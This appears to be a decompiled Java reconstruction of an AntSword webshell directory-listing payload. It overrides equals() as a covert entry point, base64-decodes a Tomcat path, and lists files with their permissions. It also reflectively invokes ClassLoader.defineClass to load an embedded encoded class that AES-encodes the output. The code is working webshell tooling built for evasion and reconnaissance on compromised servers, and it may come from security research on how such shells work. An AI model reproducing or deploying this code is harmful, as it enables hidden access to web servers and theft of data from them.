package com.pinger.javasec.ant;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


/**
 * @author : p1n93r
 * @date : 2021/11/29 12:08
 */
public class Dir {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder = "base64";
    public String cs = "UTF8";
    public String randomPrefix = "2";
    public String decoderClassdata;

    public Dir() {
    }

    public static void main(String[] args) {
        Dir dir = new Dir();
        dir.equals("");
    }


    public boolean equals(Object var1) {
        this.parseObj(var1);
        this.cs = String.valueOf(Charset.forName(System.getProperty("sun.jnu.encoding")));
        StringBuffer var2 = new StringBuffer();
        String var3 = "ea5c7";
        String var4 = "cbaa5";
        String var5 = "qad83e5be18421";
        String var6 = "r32760fcdd7e16";

        try {
//            this.response.setContentType("text/html");
//            this.request.setCharacterEncoding(String.valueOf(this.cs));
//            this.response.setCharacterEncoding(String.valueOf(this.cs));
            String var7 = this.decode("HaRTovUHJvZ3JhbSBGaWxlcy9hcGFjaGUtdG9tY2F0LTguNS4zOC9iaW4v");
            this.decoderClassdata = this.decode("baeXY2NnZnQUFBRFFBcndvQUpRQk1DZ0ExQUUwSkFEVUFUZ29BTlFCUENBQlFDZ0FxQUZFSEFGSUlBRk1LQUFjQVZBZ0FWUW9BRGdCV0J3QlhDZ0FNQUZnSEFGa0tBQTRBV2dvQURnQmJDZ0ExQUZ3SEFGMEtBQklBVEFvQUVnQmVDZ0FTQUY4SEFHQUpBR0VBWWdvQUZnQmpDZ0JrQUdVSEFHWUtBQm9BWndnQWFBb0FZUUJwQ0FCcUNnQXFBR3NJQUd3S0FDTUFiUWdBYmdjQWJ3b0FJd0J3QndCeENnQnlBSE1LQUNVQWRBZ0FkUWNBZGdjQWR3Z0FlQW9BSXdCNUNnQjZBSHNJQUh3S0FIMEFmZ29BZlFCZkNBQi9DQUNBQ2dBcUFJRUtBQ29BZ2djQWd3RUFBM0psY3dFQUVreHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQWxoWlhORmJtTnZaR1VCQUNZb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFEVk4wWVdOclRXRndWR0ZpYkdVSEFHQUJBQXhpWVhObE5qUkZibU52WkdVQkFCWW9XMElwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QndCM0J3QnZCd0J4QVFBS1JYaGpaWEIwYVc5dWN3RUFDWEpoYm1SdmJVdGxlUUVBRkNncFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUlkRzlUZEhKcGJtY0JBQXBUYjNWeVkyVkdhV3hsQVFBUVFYTnZkWFJ3ZFhSQlpYTXVhbUYyWVF3QU9BQTVEQUE5QUQ0TUFEWUFOd3dBUndCSUFRQUZkWFJtTFRnTUFJUUFoUUVBSDJwaGRtRjRMMk55ZVhCMGJ5OXpjR1ZqTDFObFkzSmxkRXRsZVZOd1pXTUJBQU5CUlZNTUFEZ0FoZ0VBRkVGRlV5OURRa012VUV0RFV6VlFZV1JrYVc1bkRBQ0hBSWdCQUNGcVlYWmhlQzlqY25sd2RHOHZjM0JsWXk5SmRsQmhjbUZ0WlhSbGNsTndaV01NQURnQWlRRUFFMnBoZG1GNEwyTnllWEIwYnk5RGFYQm9aWElNQUlvQWl3d0FqQUNOREFCQkFFSUJBQmRxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNnd0FqZ0NQREFCSkFFZ0JBQk5xWVhaaEwyeGhibWN2UlhoalpYQjBhVzl1QndDUURBQ1JBSklNQUpNQVNBY0FsQXdBbFFBOEFRQWFhbUYyWVM5c1lXNW5MMUoxYm5ScGJXVkZlR05sY0hScGIyNE1BRGdBbGdFQURHcGhkbUV1ZG1WeWMybHZiZ3dBbHdBK0FRQURNUzQ1REFDWUFKa0JBQkJxWVhaaExuVjBhV3d1UW1GelpUWTBEQUNhQUpzQkFBcG5aWFJGYm1OdlpHVnlBUUFQYW1GMllTOXNZVzVuTDBOc1lYTnpEQUNjQUowQkFCQnFZWFpoTDJ4aGJtY3ZUMkpxWldOMEJ3Q2VEQUNmQUtBTUFLRUFvZ0VBRG1WdVkyOWtaVlJ2VTNSeWFXNW5BUUFDVzBJQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVdjM1Z1TG0xcGMyTXVRa0ZUUlRZMFJXNWpiMlJsY2d3QW93Q2tCd0NsREFDbUFLY0JBQVpsYm1OdlpHVUhBS2dNQUtrQXFnRUFBUzBCQUFBTUFLc0FyQXdBclFDdUFRQUxRWE52ZFhSd2RYUkJaWE1CQUFoblpYUkNlWFJsY3dFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUJjb1cwSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BWZ0VBQzJkbGRFbHVjM1JoYm1ObEFRQXBLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllYZ3ZZM0o1Y0hSdkwwTnBjR2hsY2pzQkFBVW9XMElwVmdFQUJHbHVhWFFCQUVJb1NVeHFZWFpoTDNObFkzVnlhWFI1TDB0bGVUdE1hbUYyWVM5elpXTjFjbWwwZVM5emNHVmpMMEZzWjI5eWFYUm9iVkJoY21GdFpYUmxjbE53WldNN0tWWUJBQWRrYjBacGJtRnNBUUFHS0Z0Q0tWdENBUUFHWVhCd1pXNWtBUUF0S0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WjBKMWFXeGtaWEk3QVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUEyOTFkQUVBRlV4cVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdE93RUFDbWRsZEUxbGMzTmhaMlVCQUJOcVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdEFRQUhjSEpwYm5Sc2JnRUFHQ2hNYW1GMllTOXNZVzVuTDFSb2NtOTNZV0pzWlRzcFZnRUFDMmRsZEZCeWIzQmxjblI1QVFBSlkyOXRjR0Z5WlZSdkFRQVZLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxKQVFBSFptOXlUbUZ0WlFFQUpTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWxuWlhSTlpYUm9iMlFCQUVBb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1cweHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0tVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0FRQVlhbUYyWVM5c1lXNW5MM0psWm14bFkzUXZUV1YwYUc5a0FRQUdhVzUyYjJ0bEFRQTVLRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMXRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QVFBSVoyVjBRMnhoYzNNQkFCTW9LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFXWjJWMFJHVmpiR0Z5WldSRGIyNXpkSEoxWTNSdmNnRUFNeWhiVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNwVEdwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBOdmJuTjBjblZqZEc5eU93RUFIV3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMME52Ym5OMGNuVmpkRzl5QVFBTGJtVjNTVzV6ZEdGdVkyVUJBQ2NvVzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBNXFZWFpoTDNWMGFXd3ZWVlZKUkFFQUNuSmhibVJ2YlZWVlNVUUJBQklvS1V4cVlYWmhMM1YwYVd3dlZWVkpSRHNCQUFweVpYQnNZV05sUVd4c0FRQTRLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFsemRXSnpkSEpwYm1jQkFCWW9TVWtwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QUNFQU5RQWxBQUFBQVFBQUFEWUFOd0FBQUFZQUFRQTRBRGtBQVFBNkFBQUFIUUFCQUFFQUFBQUZLcmNBQWJFQUFBQUJBRHNBQUFBR0FBRUFBQUFKQUFFQU9BQThBQUVBT2dBQUFDNEFBd0FDQUFBQURpcTNBQUVxS2l1M0FBSzFBQU94QUFBQUFRQTdBQUFBRGdBREFBQUFDd0FFQUF3QURRQU5BQUlBUFFBK0FBRUFPZ0FBQU00QUJBQUpBQUFBZENxM0FBUVNCYllBQmsyN0FBZFpMQklJdHdBSlRoSUt1QUFMT2dTN0FBeFpMTGNBRFRvRkdRUUVMUmtGdGdBUEdRUXJFZ1cyQUFhMkFCQTZCaW9aQnJjQUVUb0hLaXkzQUJFNkNMc0FFbG0zQUJNWkNMWUFGQmtIdGdBVXRnQVZzRTJ5QUJjc3RnQVl0Z0FadXdBYVdTeTNBQnUvQUFFQUFBQmZBR0FBRmdBQ0FEc0FBQUF5QUF3QUFBQVJBQW9BRWdBVkFCTUFIQUFVQUNZQUZRQXZBQllBUEFBWEFFUUFHQUJMQUJrQVlBQWFBR0VBR3dCckFCd0FQd0FBQUFnQUFmY0FZQWNBUUFBQ0FFRUFRZ0FDQURvQUFBRGlBQVlBQmdBQUFKQVNITGdBSFUwc0VoNjJBQitiQUVVU0lMZ0FJVTR0RWlJRHZRQWp0Z0FrTFFPOUFDVzJBQ1k2QkJrRXRnQW5FaWdFdlFBaldRTVNLVk8yQUNRWkJBUzlBQ1ZaQXl0VHRnQW13QUFxT2dXbkFEOFNLN2dBSVU0dEE3MEFJN1lBTEFPOUFDVzJBQzA2QkJrRXRnQW5FaTRFdlFBaldRTVNLVk8yQUNRWkJBUzlBQ1ZaQXl0VHRnQW13QUFxT2dVWkJiQUFBQUFDQURzQUFBQW1BQWtBQUFBaEFBWUFKUUFQQUNZQUZRQW5BQ2tBS0FCUkFDb0FWd0FyQUdnQUxBQ05BQzRBUHdBQUFCUUFBdndBVVFjQVEvNEFPd2NBUkFjQVJRY0FRd0JHQUFBQUJBQUJBQllBQWdCSEFFZ0FBUUE2QUFBQUxBQURBQUVBQUFBVXVBQXZ0Z0F3RWpFU01yWUFNd01RRUxZQU5MQUFBQUFCQURzQUFBQUdBQUVBQUFBeUFBRUFTUUJJQUFFQU9nQUFBQjBBQVFBQkFBQUFCU3EwQUFPd0FBQUFBUUE3QUFBQUJnQUJBQUFBTmdBQkFFb0FBQUFDQUVzPQ==");
            var2.append(this.FileTreeCode(var7));
        } catch (Exception var9) {
            var2.append("ERROR:// " + var9.toString());
        }

        try {
            System.out.println(var3 + this.asoutput(var2.toString()) + var4);
        } catch (Exception var8) {
        }

        return true;
    }

    public String decode(String var1) throws Exception {
        boolean var2 = false;

        try {
            int var5 = Integer.parseInt(this.randomPrefix);
            var1 = var1.substring(var5);
        } catch (Exception var4) {
            var2 = false;
        }

        return this.encoder.equals("base64") ? new String(this.Base64DecodeToByte(var1), this.cs) : var1;
    }

    public String FileTreeCode(String var1) throws Exception {
        File var2 = new File(var1);
        File[] var3 = var2.listFiles();
        String var4 = "";
        String var7 = "";
        SimpleDateFormat var9 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        for(int var10 = 0; var10 < var3.length; ++var10) {
            Date var8 = new Date(var3[var10].lastModified());
            String var5 = var9.format(var8);
            String var6 = var3[var10].canRead() ? "R" : "-";
            var6 = var6 + (var3[var10].canWrite() ? "W" : "-");

            try {
                var6 = var6 + ((Boolean)var3[var10].getClass().getMethod("canExecute").invoke(var3[var10]) ? "X" : "-");
            } catch (Exception var12) {
                var6 = var6 + "-";
            }

            String var11 = var3[var10].getName();
            if (var3[var10].isDirectory()) {
                var4 = var4 + var11 + "/\t" + var5 + "\t" + var3[var10].length() + "\t" + var6 + "\n";
            } else {
                var7 = var7 + var11 + "\t" + var5 + "\t" + var3[var10].length() + "\t" + var6 + "\n";
            }
        }

        var4 = var4 + var7;
        return var4;
    }

    public void parseObj(Object var1) {
//        if (var1.getClass().isArray()) {
//            Object[] var2 = (Object[])((Object[])var1);
//            this.request = (HttpServletRequest)var2[0];
//            this.response = (HttpServletResponse)var2[1];
//        } else {
//            try {
//                Class var9 = Class.forName("javax.servlet.jsp.PageContext");
//                this.request = (HttpServletRequest)var9.getDeclaredMethod("getRequest").invoke(var1);
//                this.response = (HttpServletResponse)var9.getDeclaredMethod("getResponse").invoke(var1);
//            } catch (Exception var8) {
//                if (var1 instanceof HttpServletRequest) {
//                    this.request = (HttpServletRequest)var1;
//
//                    try {
//                        Field var3 = this.request.getClass().getDeclaredField("request");
//                        var3.setAccessible(true);
//                        HttpServletRequest var4 = (HttpServletRequest)var3.get(this.request);
//                        Field var5 = var4.getClass().getDeclaredField("response");
//                        var5.setAccessible(true);
//                        this.response = (HttpServletResponse)var5.get(var4);
//                    } catch (Exception var7) {
//                        try {
//                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(var1);
//                        } catch (Exception var6) {
//                        }
//                    }
//                }
//            }
//        }

    }

    public String asoutput(String var1) {
        try {
            byte[] var2 = this.Base64DecodeToByte(this.decoderClassdata);
            Method var3 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var3.setAccessible(true);
            Class var4 = (Class)var3.invoke(this.getClass().getClassLoader(), var2, 0, var2.length);
            return var4.getConstructor(String.class).newInstance(var1).toString();
        } catch (Exception var5) {
            return var1;
        }
    }

    public byte[] Base64DecodeToByte(String var1) {
        Object var2 = null;
        String var3 = System.getProperty("java.version");

        try {
            Class var4;
            byte[] var7;
            if (var3.compareTo("1.9") >= 0) {
                var4 = Class.forName("java.util.Base64");
                Object var5 = var4.getMethod("getDecoder").invoke((Object)null);
                var7 = (byte[])((byte[])var5.getClass().getMethod("decode", String.class).invoke(var5, var1));
            } else {
                var4 = Class.forName("sun.misc.BASE64Decoder");
                var7 = (byte[])((byte[])var4.getMethod("decodeBuffer", String.class).invoke(var4.newInstance(), var1));
            }

            return var7;
        } catch (Exception var6) {
            return new byte[0];
        }
    }
}
